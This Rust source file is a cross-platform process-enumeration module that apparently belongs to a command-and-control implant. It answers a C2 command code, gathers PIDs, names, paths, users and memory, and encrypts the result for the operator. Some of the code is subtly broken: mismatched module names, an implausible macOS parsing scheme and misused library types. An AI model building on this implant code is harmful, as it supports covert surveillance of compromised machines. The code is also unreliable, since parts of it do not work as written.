//! Process list module — cross-platform process enumeration.
//!
//! Collects process information:
//! - Windows: CreateToolhelp32Snapshot + Process32First/Next
//! - Linux: Parse /proc directory
//! - macOS: proc_pidinfo or sysctl

use anyhow::Result;
use serde::{Serialize, Deserialize};
use tracing::info;

use crate::c2::Command;
use crate::crypto;
use crate::modules::ModuleError;

/// Process information
#[derive(Debug, Serialize, Deserialize)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: String,
    pub path: String,
    pub user: String,
    pub cpu_time: f64,
    pub memory_bytes: u64,
    pub state: String,
}

/// Process list module
pub struct ProcessListModule;

impl ProcessListModule {
    pub fn new() -> Self {
        Self
    }

    /// Enumerate processes (platform-specific)
    #[cfg(windows)]
    fn enumerate_processes() -> Result<Vec<ProcessInfo>, ModuleError> {
        use windows::Win32::Foundation;
        use windows::Win32::System::Diagnostics::ToolHelp;
        use windows::Win32::System::Threading;

        let mut processes = Vec::new();

        // Create snapshot of all processes
        let snapshot = unsafe {
            ToolHelp::CreateToolhelp32Snapshot(
                ToolHelp::TH32CS_SNAPPROCESS | ToolHelp::TH32CS_SNAPTHREAD,
                0,
            )
        }.map_err(|_| ModuleError::Execution("Failed to create process snapshot".to_string()))?;

        let mut pe = ToolHelp::PROCESSENTRY32 {
            dwSize: std::mem::size_of::<ToolHelp::PROCESSENTRY32>() as u32,
            ..Default::default()
        };

        unsafe {
            if ToolHelp::Process32First(snapshot, &mut pe).is_ok() {
                loop {
                    let pid = pe.th32ProcessID;
                    let name = String::from_utf16_lossy(
                        &pe.szExeFile[..pe.szExeFile.iter().position(|&c| c == 0).unwrap_or(pe.szExeFile.len())]
                    );

                    // Get process path
                    let path = Self::get_process_path(pid).unwrap_or_default();

                    // Get user
                    let user = Self::get_process_user(pid).unwrap_or_else(|| "SYSTEM".to_string());

                    processes.push(ProcessInfo {
                        pid,
                        name,
                        path,
                        user,
                        cpu_time: 0.0,
                        memory_bytes: 0,
                        state: "running".to_string(),
                    });

                    if ToolHelp::Process32Next(snapshot, &mut pe).is_err() {
                        break;
                    }
                }
            }
        }

        unsafe { Foundation::CloseHandle(snapshot) }.ok();

        Ok(processes)
    }

    #[cfg(windows)]
    fn get_process_path(_pid: u32) -> Result<String, std::io::Error> {
        // Get process image path via NtQueryInformationProcess
        use windows::Win32::Foundation;
        use windows::Win32::System::Threading;

        let handle = unsafe {
            Thread::OpenProcess(
                Thread::PROCESS_QUERY_LIMITED_INFORMATION,
                false,
                _pid,
            )
        };

        if let Ok(handle) = handle {
            let mut path_buf = [0u16; 260];
            let mut size = path_buf.len() as u32;
            let result = unsafe {
                Thread::QueryFullProcessImageNameW(
                    Foundation::HANDLE(handle.0),
                    0,
                    &mut path_buf,
                    &mut size,
                )
            };

            if result.as_bool() {
                return Ok(String::from_utf16_lossy(&path_buf[..size as usize]));
            }
        }

        Err(std::io::Error::new(std::io::ErrorKind::NotFound, "Process not found"))
    }

    #[cfg(windows)]
    fn get_process_user(_pid: u32) -> Result<String, std::io::Error> {
        Ok("SYSTEM".to_string())
    }

    #[cfg(target_os = "linux")]
    fn enumerate_processes() -> Result<Vec<ProcessInfo>, ModuleError> {
        let mut processes = Vec::new();

        let proc_dir = std::fs::read_dir("/proc")
            .map_err(ModuleError::Io)?;

        for entry in proc_dir {
            let entry = entry.map_err(ModuleError::Io)?;
            let file_name = entry.file_name();
            let pid_str = file_name.to_string_lossy();

            if let Ok(pid) = pid_str.parse::<u32>() {
                // Skip non-numeric directories
                if pid == 0 {
                    continue;
                }

                // Read /proc/[pid]/comm for process name
                let name = std::fs::read_to_string(format!("/proc/{}/comm", pid))
                    .ok()
                    .unwrap_or_else(|| format!("process-{}", pid));

                // Read /proc/[pid]/status for memory info
                let status = std::fs::read_to_string(format!("/proc/{}/status", pid))
                    .ok()
                    .unwrap_or_default();

                let memory_bytes = status
                    .lines()
                    .find(|l| l.starts_with("VmRSS:"))
                    .and_then(|l| l.split(':').nth(1))
                    .and_then(|v| v.trim().split(' ').next())
                    .and_then(|v| v.parse::<usize>().ok())
                    .map(|kb| kb * 1024)
                    .unwrap_or(0);

                // Get command line
                let path = std::fs::read_link(format!("/proc/{}/exe", pid))
                    .ok()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_default();

                // Get user
                let user = std::fs::read_to_string(format!("/proc/{}/status", pid))
                    .ok()
                    .and_then(|s| {
                        s.lines()
                            .find(|l| l.starts_with("Uid:"))
                            .and_then(|l| l.split(':').nth(1))
                            .and_then(|v| v.split_whitespace().next())
                            .and_then(|uid| nix::unistd::Uid::from_raw(uid.parse().unwrap_or(0)))
                            .map(|uid| uid.name().unwrap_or_else(|| format!("uid-{}", uid)))
                    })
                    .unwrap_or_else(|| "unknown".to_string());

                processes.push(ProcessInfo {
                    pid,
                    name: name.trim().to_string(),
                    path,
                    user,
                    cpu_time: 0.0,
                    memory_bytes: memory_bytes as u64,
                    state: "running".to_string(),
                });
            }
        }

        Ok(processes)
    }

    #[cfg(target_os = "macos")]
    fn enumerate_processes() -> Result<Vec<ProcessInfo>, ModuleError> {
        use sysctl::Sysctl;

        let mut processes = Vec::new();

        // Get process list via sysctl
        let kinfo = sysctl::Ctl::new("kern.proc.all")
            .map_err(|_| ModuleError::Execution("sysctl failed".to_string()))?
            .value()
            .map(|v| {
                let bytes = v.as_u32_slice();
                // Parse kinfo_proc structures
                bytes.to_vec()
            })
            .unwrap_or_default();

        // Parse kinfo_proc structures (64-byte each on macOS)
        for chunk in kinfo.chunks(64) {
            if chunk.len() == 64 {
                let pid = u32::from_le_bytes([chunk[0], chunk[1], chunk[2], chunk[3]]);
                if pid == 0 {
                    continue;
                }

                processes.push(ProcessInfo {
                    pid,
                    name: format!("process-{}", pid),
                    path: String::new(),
                    user: "unknown".to_string(),
                    cpu_time: 0.0,
                    memory_bytes: 0,
                    state: "running".to_string(),
                });
            }
        }

        Ok(processes)
    }
}

#[async_trait::async_trait]
impl crate::modules::Module for ProcessListModule {
    fn name(&self) -> &str {
        "process_list"
    }

    async fn execute(&self, cmd: &Command) -> Result<Vec<u8>, ModuleError> {
        if cmd.cmd_type != 0x08 {
            return Err(ModuleError::Execution("no_match".to_string()));
        }

        let processes = Self::enumerate_processes()?;

        // Serialize process info
        let json = serde_json::to_string_pretty(&processes)
            .map_err(|e| ModuleError::Execution(format!("JSON serialize: {}", e)))?;

        // Encrypt result
        let encrypted = crypto::encrypt_with_integrity(json.as_bytes(), &cmd.crypto_key);

        info!("Process list: {} processes enumerated", processes.len());
        Ok(encrypted)
    }
}
